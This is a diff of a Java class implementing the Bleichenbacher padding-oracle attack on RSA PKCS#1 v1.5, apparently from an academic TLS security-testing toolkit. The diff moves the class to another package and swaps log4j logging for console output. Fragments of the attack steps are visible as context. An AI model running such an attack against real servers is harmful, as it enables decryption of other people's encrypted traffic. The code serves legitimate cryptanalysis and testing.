@@ -1,18 +1,13 @@
-package de.rub.nds.ssl.analyzer.attacker;
+package de.rub.nds.ssl.attacker.bleichenbacher;
 
-import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.Interval;
-import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
-import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.AOracle;
-import de.rub.nds.ssl.stack.Utility;
+import de.rub.nds.ssl.attacker.bleichenbacher.oracles.AOracle;
+import de.rub.nds.ssl.attacker.misc.Utility;
 import java.io.BufferedWriter;
 import java.io.FileWriter;
 import java.io.IOException;
-import java.io.OutputStreamWriter;
 import java.math.BigInteger;
 import java.security.interfaces.RSAPublicKey;
 import java.util.ArrayList;
-import org.apache.log4j.Level;
-import org.apache.log4j.Logger;
 
 /**
  * Bleichenbacher algorithm.
@@ -41,11 +36,7 @@ public class Bleichenbacher {
     protected final boolean WRITE_TO_FILE = false;
     protected final String FILE_NAME = "ValidQueries.csv";
     protected BufferedWriter bw;
-    /**
-     * Initialize the log4j logger.
-     */
-    static Logger logger = Logger.getLogger(Bleichenbacher.class);
-
+    
     public Bleichenbacher(final byte[] msg,
             final AOracle pkcsOracle, final boolean msgPKCScofnorm) {
         this.encryptedMsg = msg.clone();
@@ -65,8 +56,8 @@ public class Bleichenbacher {
         }
         tmp = ((tmp / 8) - 2) * 8;
         bigB = BigInteger.valueOf(2).pow(tmp);
-        logger.info("B computed: " + bigB);
-        logger.info("Blocksize: " + blockSize + " bytes");
+        System.out.println("B computed: " + bigB);
+        System.out.println("Blocksize: " + blockSize + " bytes");
         //decryptedMsg = oracle.decrypt(encryptedMsg);
         //System.out.println("our goal: " + new BigInteger(decryptedMsg));
 
@@ -83,9 +74,9 @@ public class Bleichenbacher {
         int i = 0;
         boolean solutionFound = false;
 
-        logger.info("Step 1: Blinding");
+        System.out.println("Step 1: Blinding");
         if (this.msgIsPKCS) {
-            logger.info("Step skipped --> "
+            System.out.println("Step skipped --> "
                     + "Message is considered as PKCS compliant.");
             s0 = BigInteger.ONE;
             c0 = new BigInteger(1, encryptedMsg);
@@ -100,17 +91,17 @@ public class Bleichenbacher {
         i++;
 
         while (!solutionFound) {
-            logger.info("Step 2: Searching for PKCS conforming messages.");
+            System.out.println("Step 2: Searching for PKCS conforming messages.");
             stepTwo(i);
 
-            logger.info("Step 3: Narrowing the set of soultions.");
+            System.out.println("Step 3: Narrowing the set of soultions.");
             stepThree(i);
 
-            logger.info("Step 4: Computing the solution.");
+            System.out.println("Step 4: Computing the solution.");
             solutionFound = stepFour(i);
             i++;
 
-            logger.info("// Total # of queries so far: "
+            System.out.println("// Total # of queries so far: "
                     + oracle.getNumberOfQueries());
         }
     }
@@ -139,7 +130,7 @@ public class Bleichenbacher {
             new Interval(BigInteger.valueOf(2).multiply(bigB),
             (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE))};
 
-        logger.info(" Found s0 : " + si);
+        System.out.println(" Found s0 : " + si);
     }
 
     /* extensions for feature attacks handled in the derived classes*/
@@ -160,7 +151,7 @@ public class Bleichenbacher {
             }
         }
 
-        logger.info(" Found s" + i + ": " + si);
+        System.out.println(" Found s" + i + ": " + si);
     }
 
     protected void stepTwoA() throws OracleException {
@@ -168,7 +159,7 @@ public class Bleichenbacher {
         boolean pkcsConform;
         BigInteger n = publicKey.getModulus();
 
-        logger.info("Step 2a: Starting the search");
+        System.out.println("Step 2a: Starting the search");
         // si = ceil(n/(3B))
         BigInteger tmp[] = n.divideAndRemainder(BigInteger.valueOf(3).multiply(
                 bigB));
@@ -194,7 +185,7 @@ public class Bleichenbacher {
     private void stepTwoB() throws OracleException {
         byte[] send;
         boolean pkcsConform;
-        logger.info("Step 2b: Searching with more than"
+        System.out.println("Step 2b: Searching with more than"
                 + " one interval left");
 
         do {
@@ -212,7 +203,7 @@ public class Bleichenbacher {
         boolean pkcsConform;
         BigInteger n = publicKey.getModulus();
 
-        logger.info("Step 2c: Searching with one interval left");
+        System.out.println("Step 2c: Searching with one interval left");
 
         // initial ri computation - ri = 2(b*(si-1)-2*B)/n
         BigInteger ri = si.multiply(m[0].upper);
@@ -306,7 +297,7 @@ public class Bleichenbacher {
             }
         }
 
-        logger.info(" # of intervals for M" + i + ": " + ms.size());
+        System.out.println(" # of intervals for M" + i + ": " + ms.size());
         m = ms.toArray(new Interval[ms.size()]);
     }
 
@@ -318,7 +309,7 @@ public class Bleichenbacher {
             solution = solution.multiply(m[0].upper).mod(publicKey.getModulus());
 
             //if(solution.compareTo(new BigInteger(1, decryptedMsg)) == 0) {
-            logger.info("====> Solution found!\n" + Utility.bytesToHex(solution.
+            System.out.println("====> Solution found!\n" + Utility.bytesToHex(solution.
                     toByteArray()));
             //    System.out.println("original decrypted message: \n" + Utility.bytesToHex(decryptedMsg));
             //}
@@ -326,7 +317,7 @@ public class Bleichenbacher {
                 try {
                     bw.close();
                 } catch (IOException ioe) {
-                    logger.warn("unable to close the file " + FILE_NAME, ioe);
+                    System.out.println("unable to close the file " + FILE_NAME);
                 }
             }
 
@@ -391,7 +382,7 @@ public class Bleichenbacher {
         BigInteger tmp;
 
         if (oracle.getNumberOfQueries() % 100 == 0) {
-            logger.debug("# of queries so far: " + oracle.
+            System.out.println("# of queries so far: " + oracle.
                     getNumberOfQueries());
         }
 
@@ -428,7 +419,7 @@ public class Bleichenbacher {
                 bw.append(Utility.bytesToHex(send));
                 bw.append(";\r\n");
             } catch (IOException ioe) {
-                logger.warn("unable to write to the file " + FILE_NAME, ioe);
+                System.out.println("unable to write to the file " + FILE_NAME);
             }
         }
     }
